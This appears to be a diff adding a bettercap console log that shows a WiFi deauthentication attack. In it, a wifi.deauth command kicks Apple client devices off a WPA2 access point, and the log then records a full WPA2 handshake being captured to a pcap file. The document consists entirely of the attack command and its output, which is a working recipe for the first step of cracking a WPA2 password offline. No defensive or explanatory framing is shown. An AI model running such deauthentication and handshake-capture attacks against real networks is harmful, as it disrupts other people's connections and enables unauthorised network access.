@@ -1,0 +1,12 @@
+wlan0 » wifi.deauth de:ad:ba:be:00:01
+wlan0 » [09:38:46] [sys.log] [inf] wifi deauthing client 38:f9:d3:4c:0f:cf
+(Apple, Inc.) from AP so-smart- (channel:36 encryption:WPA2)
+wlan0 » [09:38:48] [sys.log] [inf] wifi deauthing client 18:3e:ef:d1:16:ed
+(Apple, Inc.) from AP so-smart- (channel:36 encryption:WPA2)
+wlan0 » [09:38:48] [wifi.deauthentication] a1=de:ad:ba:be:00:02
+a2=38:f9:d3:4c:0f:cf a3=de:ad:ba:be:00:02 reason=Ap. full (-47 dBm)
+wlan0 » [09:38:49] [wifi.client.probe] station 18:3e:ef:d1:16:ed (Apple,
+Inc.) is probing for SSID so-smart-tv5 (-25 dBm)
+wlan0 » [09:38:49] [wifi.client.handshake] captured 18:3e:ef:d1:16:ed ->
+so-smart-tv5 (de:ad:ba:be:00:01) WPA2 handshake (full) to /root/bettercap-
+wifi-handshakes.pcap
